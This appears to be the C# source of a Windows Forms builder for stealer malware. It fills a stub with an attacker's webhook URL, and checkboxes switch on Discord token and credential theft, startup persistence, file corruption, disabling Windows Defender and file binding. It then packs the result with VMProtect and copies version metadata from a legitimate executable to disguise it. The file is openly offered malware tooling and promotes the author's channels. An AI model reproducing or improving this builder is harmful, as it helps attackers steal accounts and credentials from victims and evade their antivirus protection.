using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp2
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var stubSource = Properties.Resources.Stub;
                    stubSource = stubSource.Replace("%Title%", textBox2.Text);
                    stubSource = stubSource.Replace("%Description%", textBox4.Text);
                    stubSource = stubSource.Replace("%Product%", textBox5.Text);
                    stubSource = stubSource.Replace("%Company%", textBox3.Text);
                    stubSource = stubSource.Replace("%Copyright%", textBox6.Text);
                    stubSource = stubSource.Replace("%Trademark%", textBox7.Text);
                    stubSource = stubSource.Replace("%v1%", numericUpDown2.Text);
                    stubSource = stubSource.Replace("%v2%", numericUpDown3.Text);
                    stubSource = stubSource.Replace("%v3%", numericUpDown1.Text);
                    stubSource = stubSource.Replace("%v4%", numericUpDown4.Text);
                    stubSource = stubSource.Replace("%Guid%", Guid.NewGuid().ToString());
                    stubSource = stubSource.Replace("#gaywebhuk", textBox1.Text);

                    if (string.IsNullOrEmpty(textBox8.Text) == false) // file bind // done
                    {
                        stubSource = stubSource.Replace("//bindFile();HEHE", "bindFile();");
                        stubSource = stubSource.Replace("binderlinkza", textBox8.Text);
                    }
                    if (metroCheckBox1.Checked == true) // trace // done
                    {
                        stubSource = stubSource.Replace("SendSaveDat();//HEHE", "SendSave();");
                    }
                    if (metroCheckBox2.Checked == true) // startup // done
                    {
                        stubSource = stubSource.Replace("//Startup();HEHE", "Startup();");
                    }
                    if (metroCheckBox3.Checked == true) // screenshot // done
                    {
                        //stubSource = stubSource.Replace("//screenshot()HEHE", "screenshot() + ");
                        //orsbcocu screenshot
                    }
                    if (metroCheckBox4.Checked == true) // corrupt // done
                    {
                        stubSource = stubSource.Replace("//corrupt();HEHE", "corrupt();");
                    }
                    if (metroCheckBox5.Checked == true) // token // done
                    {
                        stubSource = stubSource.Replace("//tokens()HEHE", "tokens() ,");
                    }
                    if (metroCheckBox6.Checked == true) // credential
                    {
                        stubSource = stubSource.Replace("bool sendCredentials = false;", "bool sendCredentials = true;");
                    }
                    if (metroCheckBox7.Checked == true) // win defender // done
                    {
                        stubSource = stubSource.Replace("//disableDefender();HEHE", "disableDefender();");
                    }
                    if (metroCheckBox8.Checked == true) // admin
                    {
                        //stubSource = stubSource.Replace("//forceAdmin();", "forceAdmin();");
                    }

                    var isOK = Compiler.CompileFromSource(stubSource, Path.GetTempPath() + "\\xdnub.exe", string.IsNullOrWhiteSpace(icontextbox.Text) ? null : icontextbox.Text);
                    Extract("WindowsFormsApp2", Path.GetTempPath(), "Resources", "vmprotect.exe");
                    var directoryPath2 = Path.GetFullPath(saveFileDialog.FileName);
                    var XDDIJ = Path.GetTempPath() + "\\xdnub.exe";
                    ProcessStartInfo Protection = new ProcessStartInfo();
                    Protection.WindowStyle = ProcessWindowStyle.Hidden;
                    Protection.WorkingDirectory = Path.GetTempPath();
                    Protection.FileName = "vmprotect.exe";
                    Protection.UseShellExecute = true;
                    Protection.Arguments = XDDIJ;
                    Process proc = Process.Start(Protection);
                    proc.WaitForExit();
                    File.Delete(XDDIJ);
                    File.Move(Path.GetTempPath() + "\\xdnub.vmp.exe", saveFileDialog.FileName);
                    File.Delete(Path.GetTempPath() + "\\vmprotect.exe");

                    if (isOK)
                    {
                        MessageBox.Show("Done! Subscribe to Sircam");
                    }
                }
            }
        }

        private static void Extract(string nameSpace, string outFile, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            {
                using (BinaryReader r = new BinaryReader(s))
                {
                    using (FileStream fs = new FileStream(outFile + "\\" + resourceName, FileMode.OpenOrCreate))
                    {
                        using (BinaryWriter w = new BinaryWriter(fs))
                        {
                            w.Write(r.ReadBytes((int)s.Length));
                        }
                    }
                }
            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            ProcessStartInfo adres = new ProcessStartInfo("https://discord.gg/88BAk9r5f4");
            Process.Start(adres);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ProcessStartInfo adres = new ProcessStartInfo("https://www.youtube.com/channel/UCkzK-lc8uj02PVCK_QLIZ3Q");
            Process.Start(adres);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK) //icon changer 
                {
                    icontextbox.Text = openFileDialog.FileName;
                }
                else
                {
                    icontextbox.Text = string.Empty;
                    pictureBox1.ImageLocation = string.Empty;
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    textBox2.Text = fileVersionInfo.InternalName ?? string.Empty;
                    textBox4.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    textBox3.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    textBox5.Text = fileVersionInfo.ProductName ?? string.Empty;
                    textBox6.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    textBox7.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    numericUpDown2.Text = fileVersionInfo.FileMajorPart.ToString();
                    numericUpDown3.Text = fileVersionInfo.FileMinorPart.ToString();
                    numericUpDown1.Text = fileVersionInfo.FileBuildPart.ToString();
                    numericUpDown4.Text = fileVersionInfo.FilePrivatePart.ToString();
                }
            }
        }
    }
}

